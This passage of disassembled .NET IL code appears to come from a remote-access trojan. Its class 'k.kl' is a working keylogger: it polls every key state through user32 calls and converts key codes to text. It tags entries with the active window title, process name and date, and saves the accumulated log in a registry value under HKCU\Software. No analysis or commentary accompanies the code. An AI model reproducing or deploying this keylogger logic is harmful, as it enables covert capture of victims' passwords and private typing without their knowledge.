    IL_0062:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0067:  ldloc.0
    IL_0068:  ret
  } // end of method OK::ZIP

  .method private specialname instance void 
          _Lambda$__1(object a0,
                      class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance void k.OK::ED()
    IL_0006:  ret
  } // end of method OK::_Lambda$__1

  .method private specialname instance void 
          _Lambda$__2(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  castclass  uint8[]
    IL_0007:  callvirt   instance void k.OK::Ind(uint8[])
    IL_000c:  ret
  } // end of method OK::_Lambda$__2

} // end of class k.OK

.class public auto ansi k.kl
       extends [mscorlib]System.Object
{
  .field private int32 LastAV
  .field private string LastAS
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock Clock
  .field public string Logs
  .field private object keyboard
  .field public int32 Klen
  .field public string RG
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       66 (0x42)
    .maxstack  2
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys k.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::.ctor()
    IL_0013:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock k.kl::Clock
    IL_0018:  ldarg.0
    IL_0019:  ldstr      ""
    IL_001e:  stfld      string k.kl::Logs
    IL_0023:  ldarg.0
    IL_0024:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::.ctor()
    IL_0029:  stfld      object k.kl::keyboard
    IL_002e:  ldarg.0
    IL_002f:  ldc.i4.s   20
    IL_0031:  stfld      int32 k.kl::Klen
    IL_0036:  ldarg.0
    IL_0037:  ldstr      "RG"
    IL_003c:  stfld      string k.kl::RG
    IL_0041:  ret
  } // end of method kl::.ctor

  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 wVirtKey,
                             uint32 wScanCode,
                             uint8[] lpKeyState,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) pwszBuff,
                             int32 cchBuff,
                             uint32 wFlags,
                             native int dwhkl) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] lpKeyState) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 uCode,
                                uint32 uMapType) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 dwLayout) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 vKey) cil managed preservesig
  {
  }
  .method private instance string  AV() cil managed
  {
    // Code size       320 (0x140)
    .maxstack  9
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             object V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int k.kl::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 k.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 k.kl::LastAV
      IL_0023:  ceq
      IL_0025:  box        [mscorlib]System.Boolean
      IL_002a:  ldarg.0
      IL_002b:  ldfld      string k.kl::LastAS
      IL_0030:  ldloc.3
      IL_0031:  ldnull
      IL_0032:  ldstr      "MainWindowTitle"
      IL_0037:  ldc.i4.0
      IL_0038:  newarr     [mscorlib]System.Object
      IL_003d:  ldnull
      IL_003e:  ldnull
      IL_003f:  ldnull
      IL_0040:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0045:  ldc.i4.0
      IL_0046:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_004b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AndObject(object,
                                                                                                                     object)
      IL_0050:  ldloc.3
      IL_0051:  ldnull
      IL_0052:  ldstr      "MainWindowTitle"
      IL_0057:  ldc.i4.0
      IL_0058:  newarr     [mscorlib]System.Object
      IL_005d:  ldnull
      IL_005e:  ldnull
      IL_005f:  ldnull
      IL_0060:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0065:  ldnull
      IL_0066:  ldstr      "Length"
      IL_006b:  ldc.i4.0
      IL_006c:  newarr     [mscorlib]System.Object
      IL_0071:  ldnull
      IL_0072:  ldnull
      IL_0073:  ldnull
      IL_0074:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0079:  ldc.i4.0
      IL_007a:  box        [mscorlib]System.Int32
      IL_007f:  ldc.i4.0
      IL_0080:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_0085:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_008a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_008f:  brfalse.s  IL_0096

      IL_0091:  leave      IL_0138

      IL_0096:  ldarg.0
      IL_0097:  ldloca.s   V_2
      IL_0099:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_009e:  stfld      int32 k.kl::LastAV
      IL_00a3:  ldarg.0
      IL_00a4:  ldloc.3
      IL_00a5:  ldnull
      IL_00a6:  ldstr      "MainWindowTitle"
      IL_00ab:  ldc.i4.0
      IL_00ac:  newarr     [mscorlib]System.Object
      IL_00b1:  ldnull
      IL_00b2:  ldnull
      IL_00b3:  ldnull
      IL_00b4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00b9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00be:  stfld      string k.kl::LastAS
      IL_00c3:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_00c8:  ldarg.0
      IL_00c9:  callvirt   instance string k.kl::HM()
      IL_00ce:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00d3:  ldstr      " "
      IL_00d8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00dd:  ldloc.3
      IL_00de:  ldnull
      IL_00df:  ldstr      "ProcessName"
      IL_00e4:  ldc.i4.0
      IL_00e5:  newarr     [mscorlib]System.Object
      IL_00ea:  ldnull
      IL_00eb:  ldnull
      IL_00ec:  ldnull
      IL_00ed:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00f2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_00f7:  ldstr      " "
      IL_00fc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0101:  ldarg.0
      IL_0102:  ldfld      string k.kl::LastAS
      IL_0107:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_010c:  ldc.i4.1
      IL_010d:  box        [mscorlib]System.Char
      IL_0112:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0117:  ldstr      "\r\n"
      IL_011c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0121:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0126:  stloc.0
      IL_0127:  leave.s    IL_013e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0129:  dup
      IL_012a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012f:  stloc.s    V_4
      IL_0131:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0136:  leave.s    IL_0138

    }  // end handler
    IL_0138:  ldstr      ""
    IL_013d:  ret

    IL_013e:  ldloc.0
    IL_013f:  ret
  } // end of method kl::AV

  .method private instance string  HM() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  2
    .locals init (string V_0,
             class [mscorlib]System.Exception V_1,
             valuetype [mscorlib]System.DateTime V_2)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock k.kl::Clock
      IL_0006:  callvirt   instance valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::get_LocalTime()
      IL_000b:  stloc.2
      IL_000c:  ldloca.s   V_2
      IL_000e:  ldstr      "yy/MM/dd"
      IL_0013:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_002f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.1
      IL_0022:  ldstr      "\?\?/\?\?/\?\?"
      IL_0027:  stloc.0
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002d:  leave.s    IL_002f

    }  // end handler
    IL_002f:  ldloc.0
    IL_0030:  ret
  } // end of method kl::HM

  .method private static string  VKCodeToUnicode(uint32 VKCode) cil managed
  {
    // Code size       131 (0x83)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             uint8[] V_2,
             bool V_3,
             native int V_4,
             native int V_5,
             int32 V_6,
             uint32 V_7,
             class [mscorlib]System.Text.StringBuilder V_8)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.s    V_8
      IL_0007:  ldc.i4     0xff
      IL_000c:  newarr     [mscorlib]System.Byte
      IL_0011:  stloc.2
      IL_0012:  ldloc.2
      IL_0013:  call       bool k.kl::GetKeyboardState(uint8[])
      IL_0018:  stloc.3
      IL_0019:  ldloc.3
      IL_001a:  brtrue.s   IL_0024

      IL_001c:  ldstr      ""
      IL_0021:  stloc.0
      IL_0022:  leave.s    IL_0081

      IL_0024:  ldarg.0
      IL_0025:  ldc.i4.0
      IL_0026:  call       uint32 k.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_002b:  stloc.s    V_7
      IL_002d:  call       native int k.kl::GetForegroundWindow()
      IL_0032:  stloc.s    V_4
      IL_0034:  ldc.i4.0
      IL_0035:  stloc.s    V_6
      IL_0037:  ldloc.s    V_4
      IL_0039:  ldloca.s   V_6
      IL_003b:  call       int32 k.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0040:  stloc.1
      IL_0041:  ldloc.1
      IL_0042:  call       int32 k.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    V_5
      IL_004e:  ldarg.0
      IL_004f:  ldloc.s    V_7
      IL_0051:  ldloc.2
      IL_0052:  ldloc.s    V_8
      IL_0054:  ldc.i4.5
      IL_0055:  ldc.i4.0
      IL_0056:  ldloc.s    V_5
      IL_0058:  call       int32 k.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_005d:  pop
      IL_005e:  ldloc.s    V_8
      IL_0060:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0065:  stloc.0
      IL_0066:  leave.s    IL_0081

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0072:  leave.s    IL_0074

    }  // end handler
    IL_0074:  ldarg.0
    IL_0075:  conv.ovf.i4.un
    IL_0076:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_007b:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0080:  ret

    IL_0081:  ldloc.0
    IL_0082:  ret
  } // end of method kl::VKCodeToUnicode

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       435 (0x1b3)
    .maxstack  7
    .locals init (string V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             char V_4)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      object k.kl::keyboard
    IL_0006:  ldnull
    IL_0007:  ldstr      "ShiftKeyDown"
    IL_000c:  ldc.i4.0
    IL_000d:  newarr     [mscorlib]System.Object
    IL_0012:  ldnull
    IL_0013:  ldnull
    IL_0014:  ldnull
    IL_0015:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_001a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_001f:  stloc.1
    IL_0020:  ldarg.0
    IL_0021:  ldfld      object k.kl::keyboard
    IL_0026:  ldnull
    IL_0027:  ldstr      "CapsLock"
    IL_002c:  ldc.i4.0
    IL_002d:  newarr     [mscorlib]System.Object
    IL_0032:  ldnull
    IL_0033:  ldnull
    IL_0034:  ldnull
    IL_0035:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_003a:  ldc.i4.1
    IL_003b:  box        [mscorlib]System.Boolean
    IL_0040:  ldc.i4.0
    IL_0041:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                     object,
                                                                                                                                     bool)
    IL_0046:  brfalse.s  IL_0051

    IL_0048:  ldloc.1
    IL_0049:  brfalse.s  IL_004f

    IL_004b:  ldc.i4.0
    IL_004c:  stloc.1
    IL_004d:  br.s       IL_0051

    IL_004f:  ldc.i4.1
    IL_0050:  stloc.1
    .try
    {
      IL_0051:  ldarg.1
      IL_0052:  stloc.3
      IL_0053:  ldloc.3
      IL_0054:  ldc.i4.s   112
      IL_0056:  beq.s      IL_009d

      IL_0058:  ldloc.3
      IL_0059:  ldc.i4.s   113
      IL_005b:  beq.s      IL_009d

      IL_005d:  ldloc.3
      IL_005e:  ldc.i4.s   114
      IL_0060:  beq.s      IL_009d

      IL_0062:  ldloc.3
      IL_0063:  ldc.i4.s   115
      IL_0065:  beq.s      IL_009d

      IL_0067:  ldloc.3
      IL_0068:  ldc.i4.s   116
      IL_006a:  beq.s      IL_009d

      IL_006c:  ldloc.3
      IL_006d:  ldc.i4.s   117
      IL_006f:  beq.s      IL_009d

      IL_0071:  ldloc.3
      IL_0072:  ldc.i4.s   118
      IL_0074:  beq.s      IL_009d

      IL_0076:  ldloc.3
      IL_0077:  ldc.i4.s   119
      IL_0079:  beq.s      IL_009d

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4.s   120
      IL_007e:  beq.s      IL_009d

      IL_0080:  ldloc.3
      IL_0081:  ldc.i4.s   121
      IL_0083:  beq.s      IL_009d

      IL_0085:  ldloc.3
      IL_0086:  ldc.i4.s   122
      IL_0088:  beq.s      IL_009d

      IL_008a:  ldloc.3
      IL_008b:  ldc.i4.s   123
      IL_008d:  beq.s      IL_009d

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4.s   35
      IL_0092:  beq.s      IL_009d

      IL_0094:  ldloc.3
      IL_0095:  ldc.i4.s   46
      IL_0097:  beq.s      IL_009d

      IL_0099:  ldloc.3
      IL_009a:  ldc.i4.8
      IL_009b:  bne.un.s   IL_00bd

      IL_009d:  ldstr      "["
      IL_00a2:  ldarg.1
      IL_00a3:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00a8:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00ad:  ldstr      "]"
      IL_00b2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b7:  stloc.0
      IL_00b8:  leave      IL_01b1

      IL_00bd:  ldloc.3
      IL_00be:  ldc.i4     0xa0
      IL_00c3:  beq.s      IL_00ff

      IL_00c5:  ldloc.3
      IL_00c6:  ldc.i4     0xa1
      IL_00cb:  beq.s      IL_00ff

      IL_00cd:  ldloc.3
      IL_00ce:  ldc.i4     0x10000
      IL_00d3:  beq.s      IL_00ff

      IL_00d5:  ldloc.3
      IL_00d6:  ldc.i4.s   16
      IL_00d8:  beq.s      IL_00ff

      IL_00da:  ldloc.3
      IL_00db:  ldc.i4     0x20000
      IL_00e0:  beq.s      IL_00ff

      IL_00e2:  ldloc.3
      IL_00e3:  ldc.i4.s   17
      IL_00e5:  beq.s      IL_00ff

      IL_00e7:  ldloc.3
      IL_00e8:  ldc.i4     0xa3
      IL_00ed:  beq.s      IL_00ff

      IL_00ef:  ldloc.3
      IL_00f0:  ldc.i4     0xa2
      IL_00f5:  beq.s      IL_00ff

      IL_00f7:  ldloc.3
      IL_00f8:  ldc.i4     0x40000
      IL_00fd:  bne.un.s   IL_010a

      IL_00ff:  ldstr      ""
      IL_0104:  stloc.0
      IL_0105:  leave      IL_01b1

      IL_010a:  ldloc.3
      IL_010b:  ldc.i4.s   32
      IL_010d:  bne.un.s   IL_011a

      IL_010f:  ldstr      " "
      IL_0114:  stloc.0
      IL_0115:  leave      IL_01b1

      IL_011a:  ldloc.3
      IL_011b:  ldc.i4.s   13
      IL_011d:  beq.s      IL_0124

      IL_011f:  ldloc.3
      IL_0120:  ldc.i4.s   13
      IL_0122:  bne.un.s   IL_0146

      IL_0124:  ldarg.0
      IL_0125:  ldfld      string k.kl::Logs
      IL_012a:  ldstr      "[ENTER]\r\n"
      IL_012f:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0134:  brfalse.s  IL_013e

      IL_0136:  ldstr      ""
      IL_013b:  stloc.0
      IL_013c:  leave.s    IL_01b1

      IL_013e:  ldstr      "[ENTER]\r\n"
      IL_0143:  stloc.0
      IL_0144:  leave.s    IL_01b1

      IL_0146:  ldloc.3
      IL_0147:  ldc.i4.s   9
      IL_0149:  bne.un.s   IL_0153

      IL_014b:  ldstr      "[TAP]\r\n"
      IL_0150:  stloc.0
      IL_0151:  leave.s    IL_01b1

      IL_0153:  ldloc.1
      IL_0154:  brfalse.s  IL_0165

      IL_0156:  ldarg.1
      IL_0157:  conv.ovf.u4
      IL_0158:  call       string k.kl::VKCodeToUnicode(uint32)
      IL_015d:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0162:  stloc.0
      IL_0163:  leave.s    IL_01b1

      IL_0165:  ldarg.1
      IL_0166:  conv.ovf.u4
      IL_0167:  call       string k.kl::VKCodeToUnicode(uint32)
      IL_016c:  stloc.0
      IL_016d:  leave.s    IL_01b1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016f:  dup
      IL_0170:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0175:  stloc.2
      IL_0176:  ldloc.1
      IL_0177:  brfalse.s  IL_0195

      IL_0179:  ldarg.1
      IL_017a:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_017f:  stloc.s    V_4
      IL_0181:  ldloca.s   V_4
      IL_0183:  call       instance string [mscorlib]System.Char::ToString()
      IL_0188:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_018d:  stloc.0
      IL_018e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0193:  leave.s    IL_01b1

      IL_0195:  ldarg.1
      IL_0196:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_019b:  stloc.s    V_4
      IL_019d:  ldloca.s   V_4
      IL_019f:  call       instance string [mscorlib]System.Char::ToString()
      IL_01a4:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  leave.s    IL_01b1

    }  // end handler
    IL_01b1:  ldloc.0
    IL_01b2:  ret
  } // end of method kl::Fix

  .method public instance void  WRK() cil managed
  {
    // Code size       334 (0x14e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 k.kl::Klen
    IL_0006:  ldc.i4.0
    IL_0007:  bne.un.s   IL_0011

    IL_0009:  ldarg.0
    IL_000a:  ldc.i4.s   20
    IL_000c:  stfld      int32 k.kl::Klen
    .try
    {
      IL_0011:  ldarg.0
      IL_0012:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0017:  ldstr      "Software\\"
      IL_001c:  ldarg.0
      IL_001d:  ldfld      string k.kl::RG
      IL_0022:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0027:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_002c:  ldstr      "kl"
      IL_0031:  ldstr      ""
      IL_0036:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_003b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0040:  stfld      string k.kl::Logs
      IL_0045:  leave.s    IL_0053

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  leave.s    IL_0053

    }  // end handler
    .try
    {
      IL_0053:  ldc.i4.0
      IL_0054:  stloc.0
      IL_0055:  ldloc.0
      IL_0056:  ldc.i4.1
      IL_0057:  add.ovf
      IL_0058:  stloc.0
      IL_0059:  ldc.i4.0
      IL_005a:  stloc.1
      IL_005b:  ldloc.1
      IL_005c:  call       int16 k.kl::GetAsyncKeyState(int32)
      IL_0061:  ldc.i4     0xffff8001
      IL_0066:  bne.un.s   IL_00ab

      IL_0068:  ldloc.1
      IL_0069:  stloc.2
      IL_006a:  ldarg.0
      IL_006b:  ldloc.2
      IL_006c:  callvirt   instance string k.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0071:  stloc.3
      IL_0072:  ldloc.3
      IL_0073:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0078:  ldc.i4.0
      IL_0079:  ble.s      IL_00a4

      IL_007b:  ldarg.0
      IL_007c:  ldarg.0
      IL_007d:  ldfld      string k.kl::Logs
      IL_0082:  ldarg.0
      IL_0083:  callvirt   instance string k.kl::AV()
      IL_0088:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008d:  stfld      string k.kl::Logs
      IL_0092:  ldarg.0
      IL_0093:  ldarg.0
      IL_0094:  ldfld      string k.kl::Logs
      IL_0099:  ldloc.3
      IL_009a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_009f:  stfld      string k.kl::Logs
      IL_00a4:  ldarg.0
      IL_00a5:  ldloc.2
      IL_00a6:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys k.kl::lastKey
      IL_00ab:  ldloc.1
      IL_00ac:  ldc.i4.1
      IL_00ad:  add.ovf
      IL_00ae:  stloc.1
      IL_00af:  ldloc.1
      IL_00b0:  ldc.i4     0xff
      IL_00b5:  ble.s      IL_005b

      IL_00b7:  ldloc.0
      IL_00b8:  ldc.i4     0x3e8
      IL_00bd:  bne.un.s   IL_0136

      IL_00bf:  ldc.i4.0
      IL_00c0:  stloc.0
      IL_00c1:  ldarg.0
      IL_00c2:  ldfld      int32 k.kl::Klen
      IL_00c7:  ldc.i4     0x400
      IL_00cc:  mul.ovf
      IL_00cd:  stloc.s    V_4
      IL_00cf:  ldarg.0
      IL_00d0:  ldfld      string k.kl::Logs
      IL_00d5:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00da:  ldloc.s    V_4
      IL_00dc:  ble.s      IL_00fe

      IL_00de:  ldarg.0
      IL_00df:  ldarg.0
      IL_00e0:  ldfld      string k.kl::Logs
      IL_00e5:  ldc.i4.0
      IL_00e6:  ldarg.0
      IL_00e7:  ldfld      string k.kl::Logs
      IL_00ec:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00f1:  ldloc.s    V_4
      IL_00f3:  sub.ovf
      IL_00f4:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00f9:  stfld      string k.kl::Logs
      .try
      {
        IL_00fe:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_0103:  ldstr      "Software\\"
        IL_0108:  ldarg.0
        IL_0109:  ldfld      string k.kl::RG
        IL_010e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0113:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_0118:  ldstr      "kl"
        IL_011d:  ldarg.0
        IL_011e:  ldfld      string k.kl::Logs
        IL_0123:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0128:  leave.s    IL_0136

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_012a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0134:  leave.s    IL_0136

      }  // end handler
